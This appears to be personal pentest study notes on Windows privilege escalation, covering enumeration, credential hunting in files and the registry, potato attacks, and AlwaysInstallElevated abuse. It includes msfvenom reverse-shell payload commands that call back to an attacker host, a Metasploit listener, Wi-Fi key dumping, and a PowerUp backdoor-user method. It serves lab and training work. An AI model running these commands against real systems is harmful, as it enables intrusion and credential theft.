# Windows Privilege Escalation

## Foothold

## Initial Enumeration
### System Enumeration
* Systeminfo
```cmd
systeminfo
```
* Using the pipe (|) as grep
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
* Enumerating Patching Level
> wmic must be installed for this to work. Not installed by default on Win10/11
```cmd
wmic qfe get Caption,Description,HotFixID,Installation
```

### User Enumeration
* Who am I?
```cmd
whoami
```
* What are my privileges?
```cmd
whoami /priv
```
* What groups am I in?
```cmd
whoami /groups
```
* What users are on this machine?
```cmd
net user
```
* What info can I get about a specific user?
```cmd
net user [user]
```
* What are the local groups?
```cmd
net localgroup
```
* Who's in what group?
```cmd
net localgroup [group]
```

### Network Enumeration
* Get the entire network config
```cmd
ipconfig /all
```
* Find our computer neighbors
```cmd
arp -a
```
* View the routing table
```cmd
route print
```
* What ports and services are running?
```cmd
netstat -ano
```

### Password Hunting
* Basic Password Hunting with findstr
```cmd
findstr /si [search term] [file extensions]

# Example
findstr /si password *.txt *.ini *.config
```
* Wifi passwords
```cmd
# Find the profile
netsh wlan show profile

# Show the passwords
netsh wlan show provile [SSID] key=clear
```

### AV Enumeration
* Windows Defender
```cmd
sc query windefund
```
* All the services on the machine (Look for AV)
```cmd
sc queryex type= service
```
* Firewall Settings
```cmd
netsh advfirewall firewall dump
# or
netsh firewall show state
```
* Show firewall configuration
```cmd
netsh firewall show config
```

## Automated Tools
* [WinPEAS](https://github.com/peass-ng/PEASS-ng)

* [Windows PrivEsc Checklist](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)

* [Seatbelt](https://github.com/GhostPack/Seatbelt)

* [WES-NG(Windows Exploit Suggester)](https://github.com/bitsadmin/wesng)

## Kernel Exploits
* [Big list of kernel exploits - Has not been updated in a while](https://github.com/SecWiki/windows-kernel-exploits)
* usually just upload and execute. 
* can be found using the exploit suggest in MSF (post/multi/recon/local_exploit_suggester)

## Passwords and Port Forwarding
* Search for cleartext passwords
```cmd
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```
* Common files containing passwords
```cmd
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```
* Common Registry keys containing passwords
```cmd
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
## WSL
### Resources
* HTB Practice Box - SECnotes
* [PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop---windows-subsystem-for-linux-wsl)

## Impersonation and Potato Attacks
### Resources
* [PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges)
* [Hacktricks Article](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer.html)
* [FoxGloveSecurity](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
* [Potato Breakdown by gtworek](https://github.com/gtworek/Priv2Admin)
* Basically we are looking for SEImpersonate or SEAssignPrimaryToken Privilege after `whoami /priv`
* Practice Machine - HTB Jeeves

### List of potatoes
* [God Potato](https://github.com/BeichenDream/GodPotato) - Win8-8.1 through Win11 and Server 2012-2022
* [Juicy Potato](https://github.com/ohpe/juicy-potato/releases) - ver <= Win10 1809 and Windows Server 2019
* [Sigma Potato](https://github.com/tylerdotrar/SigmaPotato) - 

## GetSystem
* Metasploit command to elevate priviliges

## RUNAS
### Resources
* Practice Machine - Access (Hint: cmdkey /list)

### Execution
* Look for Stored Credentials
```cmd
cmdkey /list
```
* Execute command as user
```cmd
C:\Windows\System32\runas.exe /user:[domain\user] /savecred "C:\Windows\System32\cmd.exe /c [command to run]"
```
## Registry

### Escalation via Autorun
#### Enumeration
##### Enumeration with SysInternals
###### [Autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
> This actually opens a window, so is not command line only. Command line is autorunsc.exe
* List all of the autorun executables in the registry
```cmd
autoruns64.exe
```
* Check permissions on the autorun executable with [accesschk64](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
```cmd
accesschk64 -wvu "[Path to executable(.exe)"
```
###### Enumeration with PowerUP
```powershell
powershell -ep bypass

#Import PowerUp module
. .\PowerUp.ps1

# Execute All Checks (Similar to WinPEAS)
Invoke-AllCheck
```
#### Exploitation
* Generate a revshell executable
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=[attackerIP] lport=[attacker port] -f exe -o [filename].exe
```
* MSFConsole
```bash
use multi/handler
set lhost=[attacker IP]
set payload windows/meterpreter/reverse_tcp
exploit
```
* Log out and log in or login as administrative user

### Escalation via AlwaysInstallElevated
#### Enuemeration
* Check if AlwaysInstallElevated is set to 1 in both of the below keys
```cmd
reg query HKLM\Softrware\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
* PowerUP & WinPEAS will show these results

#### Exploitation
##### MSFVenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=[attacker ip] lport=[attacker port] -f msi -o [filename].msi
# Setup Listener, transfer to host, execute
```
##### PowerUp
> PowerUp creates an MSI that let's you add a backdoor user and add them to any group
```cmd
# Import as above
Write-UserAddMSI
```
### via regsvc

## Executables

## Startup Applications

## DLL Hijacking

## Service Permissions

## CVE-2019-1388
